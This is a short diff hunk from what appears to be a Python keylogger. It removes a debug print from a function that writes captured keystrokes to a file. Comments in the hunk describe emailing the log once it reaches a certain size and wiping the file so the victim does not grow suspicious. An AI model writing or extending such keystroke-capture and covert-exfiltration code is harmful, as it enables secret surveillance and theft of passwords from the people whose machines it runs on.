@@ -63,7 +63,6 @@ def writeKey(keys: List[Key], filepath: str) -> None:
             if k.find("Key") == -1: # Check if it is a special key
                 keyFile.write(k)
         fileSize = os.path.getsize(filepath) # Check the size of the file and when it gets to a certain size send email
-        print(fileSize)
         if (fileSize % 1000 == 0): # Check size to send email and wipe the current text file to not arise suspiscion
             clear(filepath)
 
